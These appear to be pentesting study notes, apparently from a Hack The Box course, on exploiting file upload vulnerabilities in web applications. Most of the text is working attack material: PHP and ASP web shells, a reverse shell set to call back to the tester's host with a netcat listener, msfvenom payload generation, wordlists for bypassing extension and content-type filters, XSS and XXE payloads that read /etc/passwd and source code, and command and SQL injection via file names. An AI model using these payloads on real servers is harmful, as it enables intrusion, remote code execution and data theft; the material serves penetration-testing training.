https://book.hacktricks.xyz/pentesting-web/file-upload
https://thecyberjedi.com/php-shell-in-a-jpeg-aka-froghopper/
# Arbitrary File Upload
Identify Web Application
![[wappalyzer-fileupload.png]]
## Vulnerability Identification
###### test.php
```php
<?php echo "Hello HTB";?>
```

```url
http://SERVER_IP:PORT/uploads/test.php
```
![[hellohtb-fileupload.png]]
# Upload Exploitation
## Web Shells
### PHPBASH
```git
git clone https://github.com/Arrexel/phpbash
```

```url
http://SERVER_IP:PORT/uploads/phpbash.php
```
![[phpbash.png]]
## Writing Custom Web Shell
```php
<?php system($_REQUEST['cmd']); ?>
```

```url
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```
![[shell-fileupload.png]]
### .NET Web Application
```asp
<% eval request('cmd') %>
```
## Reverse Shell
```git
git clone https://github.com/pentestmonkey/php-reverse-shell
```
###### Modify Reverse Shell
```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```
###### Netcat Listener
```netcat
nc -lvnp OUR_PORT
```
## Generating Custom Reverse Shell Scripts
###### Msfvenom
```msfvenom
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
###### Netcat Listener
```netcat
nc -lvnp OUR_PORT
```
# Blacklist Filters
## Blacklisting Extensions
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```
## Fuzzing Extensions
```
/home/kali/Desktop/SecLists/Discovery/Web-Content/web-extensions.txt
```
![[fuzz-extensions.png]]
## Non-Blacklisted Extensions
![[non-blacklisted-extendsion.png]]
# Whitelist Filters
## Whitelisting Extensions
The following is an example of a file extension whitelist test:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
## Double Extensions
`shell.jpg.php`
![[double-extension.png]]
## Reverse Double Extension
For example, the `/etc/apache2/mods-enabled/php7.4.conf` for the `Apache2` web server may include the following configuration:
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```
## Character Injection
###### ExtensionBypassWordlist.txt
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
# Type Filters
## Content-Type
The following is an example of how a PHP web application tests the Content-Type header to validate the file type:
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
###### Wordlist for Images
```wget
sudo wget https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt
```

```cat
cat content-type.txt | grep 'image/' > image-content-types.txt
```
## MIME-Type
`Multipurpose Internet Mail Extensions (MIME)` is an internet standard that determines the type of a file through its general format and bytes structure.
[File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)
[Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
###### Determine MIME-Type
```shell
echo "this is a text file" > text.jpg 
file text.jpg 
```

```shell
echo "GIF8" > text.jpg 
file text.jpg
```
The following example shows how a PHP web application can test the MIME type of an uploaded file:
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
# Limited File Uploads
## XSS
```shell
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

```shell
exiftool HTB.jpg
```
## XXE
SVG image that leaks the content of (`/etc/passwd`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

```js
$(document).ready(function () {
  $("#submit").click(function (event) {
    event.preventDefault();
    var fd = new FormData();
    var files = $('#uploadFile')[0].files[0];
    fd.append('uploadFile', files);

    $.ajax({
      url: 'upload.php',
      type: 'post',
      data: fd,
      contentType: false,
      processData: false,
      success: function () {
        window.location.reload();
      },
    });
  });
});
```
# Other Upload Attacks
## Injections in File Name
### Command Injection
If we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution.
### XSS
We may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them.
### SQLi
We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.
## Upload Directory Disclosure
- The method we can use to disclose the uploads directory is through forcing **error messages**, as they often reveal helpful information for further exploitation. 
- One attack we can use to cause such errors is **uploading a file with a name that already exists or sending two identical requests simultaneously.** This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. 
- We may also try **uploading a file with an overly long name (e.g., 5,000 characters)**. If the web application does not handle this correctly, it may also error out and disclose the upload directory.
